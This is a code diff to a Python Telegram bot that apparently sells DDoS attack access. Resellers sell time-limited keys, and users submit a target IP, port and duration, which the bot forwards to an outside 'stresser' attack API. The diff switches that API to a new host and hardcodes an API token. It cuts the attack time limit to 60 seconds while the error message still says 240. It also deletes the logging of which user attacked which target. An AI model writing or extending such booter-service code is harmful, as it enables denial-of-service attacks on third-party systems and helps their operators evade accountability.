@@ -30,6 +30,10 @@ escaped_bot_link = BOT_LINK.replace('_', '\\_')
 # Per key cost for resellers
 KEY_COST = {"1hour": 30, "1day": 150, "7days": 450, "1month": 1100}
 
+# API Configuration
+API_URL = "https://satellitestress.st/attack"
+API_TOKEN = "25fd271b3ea106a629160f0bf606032aeaa7672b5caf9ce9d3e3f1f0d3dfb58d"
+
 # In-memory storage
 users = {}
 keys = {}
@@ -249,7 +253,7 @@ def help_command(message):
 ❌ `/remove <user_id>` - *Banish a user to the void!* 🚷
 🏅 `/resellers` - *Inspect the elite reseller ranks!* 🎖️
 💰 `/addbalance <reseller_id> <amount>` - *Bestow wealth upon a reseller!* 💎
-🗑️ `/removereseller <reseller_id>` - *Erase a reseller’s existence!* ⚰️
+🗑️ `/removereseller <reseller_id>` - *Erase a reseller's existence!* ⚰️
 """
         bot.reply_to(message, help_text, parse_mode='Markdown')
     except Exception as e:
@@ -372,7 +376,7 @@ def process_attack_details(message):
             time_val = int(details[2])
             
             # Optional: Limit max time if needed, otherwise API handles it
-            if time_val > 240:
+            if time_val > 60:
                  response = "❗️𝗘𝗿𝗿𝗼𝗿 : 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀𝘁𝗵𝗲𝗻 𝟮𝟰𝟬  𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
                  bot.reply_to(message, response)
                  return
@@ -384,30 +388,20 @@ def process_attack_details(message):
             username = message.chat.username or "No username"
 
             # Prepare API Payload
-            api_url = "https://api-production-58d6.up.railway.app/api/v1/attack"
             payload = {
                 "ip": target,
                 "port": port,
                 "time": time_val
             }
             headers = {
-                "Content-Type": "application/json"
+                "Content-Type": "application/json",
+                "Authorization": f"Bearer {API_TOKEN}"
             }
 
             try:
                 # Send request to API
-                resp = requests.post(api_url, json=payload, headers=headers, timeout=10)
+                resp = requests.post(API_URL, json=payload, headers=headers, timeout=10)
                 
-                # --- START OF ADDED LOGGING ---
-                print(f"--- API REQUEST LOG ---")
-                print(f"User: {username} (ID: {user_id})")
-                print(f"Target: {target}:{port}")
-                print(f"Time: {time_val}s")
-                print(f"API Status Code: {resp.status_code}")
-                print(f"API Response Body: {resp.text}")
-                print(f"-----------------------")
-                # --- END OF ADDED LOGGING ---
-
                 if resp.status_code == 200:
                     response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time_val} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
                     
@@ -418,13 +412,6 @@ def process_attack_details(message):
                     response = f"❌ 𝗔𝗣𝗜 𝗘𝗿𝗿𝗼𝗿: {resp.status_code}\n{resp.text}"
                     
             except Exception as e:
-                # Log the exception as well
-                print(f"--- API EXCEPTION LOG ---")
-                print(f"User: {username} (ID: {user_id})")
-                print(f"Target: {target}:{port}")
-                print(f"Exception: {str(e)}")
-                print(f"-------------------------")
-                
                 response = f"❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗰𝗼𝗻𝗻𝗲𝗰𝘁 𝘁𝗼 𝗔𝗣𝗜: {str(e)}"
 
         except ValueError:
@@ -443,7 +430,7 @@ def my_info(message):
     if user_id in admin_id:
         role = "Admin"
         key_expiration = "No access"
-        balance = "Not Applicable"  # Admins don’t have balances
+        balance = "Not Applicable"  # Admins don't have balances
     elif user_id in resellers:
         role = "Reseller"
         balance = resellers.get(user_id, 0)
@@ -451,7 +438,7 @@ def my_info(message):
     elif user_id in users:
         role = "User"
         key_expiration = users[user_id]  # Fetch expiration directly
-        balance = "Not Applicable"  # Regular users don’t have balances
+        balance = "Not Applicable"  # Regular users don't have balances
     else:
         role = "Guest"
         key_expiration = "No active key"
